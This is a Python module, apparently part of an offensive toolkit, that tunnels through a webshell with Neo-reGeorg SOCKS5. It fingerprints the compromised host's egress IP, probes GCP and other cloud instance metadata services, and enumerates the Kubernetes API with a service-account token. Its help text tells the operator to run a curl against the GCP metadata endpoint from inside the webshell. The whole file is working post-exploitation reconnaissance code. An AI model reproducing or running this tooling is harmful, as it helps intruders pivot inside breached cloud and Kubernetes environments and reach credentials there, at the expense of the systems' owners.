"""经 SOCKS5 隧道一键探测环境（IMDS / K8s API / 出口 IP）。"""
from __future__ import annotations

from typing import Callable, Optional, Tuple

from commander import socks_proxy
from commander.env_detector import EnvironmentDetector

LogFn = Callable[[str, Optional[str]], None]

_GCP_HDR = {"Metadata-Flavor": "Google"}


def _log(log: LogFn, text: str, tag: Optional[str] = None) -> None:
    log(text if text.endswith("\n") else text + "\n", tag)


def _fetch_url(url: str, *, token: str = "", skip_tls: bool = True, timeout: int = 12,
               extra_headers: Optional[dict] = None) -> Tuple[bool, str]:
    if not url.startswith("http"):
        url = "https://" + url.lstrip("/")
    headers = dict(extra_headers or {})
    if token:
        headers["Authorization"] = f"Bearer {token}"
    status, body = socks_proxy.http_fetch(
        url, "GET", headers, None, timeout, skip_tls=skip_tls, force_proxy=True,
    )
    if status is None:
        return False, body
    if status >= 400:
        return False, f"HTTP {status}: {body[:300]}"
    return True, body[:2000]


def _is_gcp_fingerprint(text: str) -> bool:
    t = text or ""
    return "Metadata-Flavor" in t or "computeMetadata" in t


def _is_empty_reply(err: str) -> bool:
    return "(52)" in (err or "") or "Empty reply" in (err or "")


def _gcp_tunnel_hint(log: LogFn, saw_gcp_fingerprint: bool) -> None:
    _log(log, "\n  ── GCP metadata 经 SOCKS 失败说明 ──\n", "cloud")
    if saw_gcp_fingerprint:
        _log(
            log,
            "  169.254 已确认是 GCP metadata（其他路径返回 Metadata-Flavor 提示），\n"
            "  但 computeMetadata 经 Neo-reGeorg 隧道返回 Empty reply (52)。\n",
            "cloud",
        )
    else:
        _log(log, "  computeMetadata 经 SOCKS 返回 Empty reply (52)。\n", "cloud")
    _log(
        log,
        "  常见原因：webshell 在 **GKE Pod** 内，metadata 不能从外部 SOCKS 二次转发访问；\n"
        "  或集群启用了 metadata concealment，仅允许 Pod 内进程直连。\n\n"
        "  替代方案（推荐）：\n"
        "  1. 在 webshell/容器内直接执行（不走 SOCKS）：\n"
        "     curl -H \"Metadata-Flavor: Google\" "
        "http://metadata.google.internal/computeMetadata/v1/project/project-id\n"
        "  2. 把 printenv 输出粘贴到「环境识别」Tab 分析\n"
        "  3. 填 K8s 内网 API IP + SA Token，经 SOCKS 探测 /version（比 IMDS 更可靠）\n",
        "warn",
    )


def run_proxy_audit(
    *,
    apiserver: str,
    token: str,
    cacert: str,
    skip_tls: bool,
    test_url: str = "",
    log: LogFn,
) -> None:
    """经 SOCKS5 隧道执行环境探测，结果通过 log(text, tag) 输出。"""
    if not socks_proxy.is_enabled():
        _log(log, "请先启用 SOCKS5 并点击「应用代理」", "danger")
        return

    cfg = socks_proxy.get_config()
    proxy_desc = f"{cfg['host']}:{cfg['port']}"
    _log(log, f"{'=' * 50}\n经 SOCKS5 一键探测  →  {proxy_desc}\n{'=' * 50}\n", "accent")

    _log(log, "── [1/5] SOCKS 隧道连通 ──\n", "accent")
    ok_tunnel, tunnel_msg = socks_proxy.verify_socks5_tunnel_connect()
    tag = "success" if ok_tunnel else "danger"
    _log(log, f"  {'✓' if ok_tunnel else '✗'} {tunnel_msg}\n", tag)
    if not ok_tunnel:
        _log(log, "隧道未通，请先「检测 SOCKS」确认 Neo-reGeorg 已连上 webshell。\n", "warn")
        return
    if "内网" in tunnel_msg or "无 HTTP 响应" in tunnel_msg:
        _log(log, "  （外网不可达属正常，继续探测内网 IMDS / K8s）\n", "warn")

    _log(log, "── [2/5] 隧道出口 IP ──\n", "accent")
    ok_ip, ip_body = _fetch_url("http://ifconfig.me", skip_tls=True, timeout=10)
    if ok_ip:
        _log(log, f"  出口 IP: {ip_body.strip()[:80]}\n", "success")
    elif "timed out" in ip_body.lower() or "无响应" in tunnel_msg:
        _log(log, "  跳过（内网 webshell 通常无公网出口）\n", "warn")
    else:
        _log(log, f"  获取失败: {ip_body}\n", "warn")

    _log(log, "── [3/5] GCP 元数据（经隧道，优先） ──\n", "accent")
    _log(log, "  webshell 在 GCP 上时，169.254.169.254 即 GCP metadata 服务\n", "cloud")
    gcp_hit = False
    gcp_metadata_ok = False
    gcp_fingerprint = False
    for label, url, status, body in EnvironmentDetector.probe_gcp_metadata(via_proxy=True, timeout=10):
        tag = "success" if status == "可达" else "cloud"
        _log(log, f"  [GCP {label}] {status}  {url}\n", tag)
        if body:
            _log(log, f"    {body.replace(chr(10), ' ')[:160]}\n", tag)
        if status == "可达":
            gcp_metadata_ok = True
        if status in ("可达", "GCP特征") or _is_gcp_fingerprint(body):
            gcp_hit = True
        if _is_gcp_fingerprint(body):
            gcp_fingerprint = True

    _log(log, "── [3b/5] 其他云 IMDS ──\n", "accent")
    for name, url, status, body in EnvironmentDetector.probe_imds(parallel=True, via_proxy=True):
        if name.startswith("GCP"):
            continue
        tag = "success" if status == "可达" else ("cloud" if status == "GCP特征" else "warn")
        _log(log, f"  [{name}] {status}  {url}\n", tag)
        if body:
            _log(log, f"    {body.replace(chr(10), ' ')[:120]}\n")
        if status in ("可达", "GCP特征") or _is_gcp_fingerprint(body):
            gcp_hit = True
            gcp_fingerprint = True

    if gcp_hit and not gcp_metadata_ok:
        _gcp_tunnel_hint(log, gcp_fingerprint)
    elif gcp_hit:
        _log(log, "\n  ✓ 判定：webshell 位于 **Google Cloud**\n", "success")
    else:
        _log(log, "\n  未确认 GCP metadata；若 webshell 在 GKE Pod 内，metadata 可能被限制\n", "warn")

    _log(log, "── [4/5] K8s API ──\n", "accent")
    apiserver = (apiserver or "").strip()
    token = (token or "").strip()
    if token and apiserver:
        ok, ver = EnvironmentDetector.probe_k8s_version(apiserver, token, cacert, skip_tls)
        _log(log, f"  /version: {(ver if ok else '失败: ' + ver)[:500]}\n", "success" if ok else "danger")
        jwt = EnvironmentDetector.parse_jwt(token)
        if jwt:
            for k in ("sub", "iss", "exp"):
                if k in jwt:
                    _log(log, f"  JWT {k}: {jwt[k]}\n")
        ok_hz, hz = _fetch_url(apiserver.rstrip("/") + "/healthz", token=token, skip_tls=skip_tls or True)
        _log(log, f"  /healthz: {(hz.strip() if ok_hz else hz)[:200]}\n", "success" if ok_hz else "warn")
        ok_ns, ns_body = _fetch_url(apiserver.rstrip("/") + "/api/v1/namespaces", token=token, skip_tls=skip_tls or True)
        if ok_ns:
            try:
                import json
                data = json.loads(ns_body)
                count = len(data.get("items", []))
                _log(log, f"  /api/v1/namespaces: 共 {count} 个命名空间\n", "success")
            except Exception:
                _log(log, f"  /api/v1/namespaces: {ns_body[:200]}\n", "success")
        else:
            _log(log, f"  /api/v1/namespaces 失败: {ns_body[:200]}\n", "warn")
    elif apiserver:
        _log(log, "  未设置 Token，尝试无认证 /version …\n", "warn")
        if "kubernetes.default" in apiserver:
            _log(log, "  ⚠ API 为 kubernetes.default.svc，经 SOCKS 隧道无法解析\n", "warn")
            _log(log, "  请改填 K8s 内网 IP，例如 https://10.x.x.x:443，并填入 SA Token\n", "warn")
        ok, ver = _fetch_url(apiserver.rstrip("/") + "/version", skip_tls=True, timeout=15)
        _log(log, f"  /version: {(ver if ok else ver)[:300]}\n", "success" if ok else "warn")
    else:
        _log(log, "  未配置 API Server，跳过 K8s 探测\n", "warn")
        _log(log, "  提示：在「K8s 命令」页填写内网 API IP + Bearer Token\n", "warn")

    _log(log, "── [5/5] 自定义探测 URL ──\n", "accent")
    custom = (test_url or "").strip()
    if custom:
        hdr = dict(_GCP_HDR) if _is_gcp_fingerprint(custom) or "computeMetadata" in custom else None
        ok, body = _fetch_url(custom, token=token if token else "", skip_tls=True, extra_headers=hdr)
        _log(log, f"  {custom}\n", "success" if ok else "danger")
        _log(log, f"  {body[:500]}\n" if ok else f"  {body}\n", "success" if ok else "danger")
    else:
        _log(log, "  （未填「探测 URL」，跳过）\n", "warn")
        _log(log, "  GCP 建议填: http://metadata.google.internal/computeMetadata/v1/project/project-id\n", "cloud")

    _log(log, f"{'=' * 50}\n经 SOCKS5 探测完成\n", "accent")
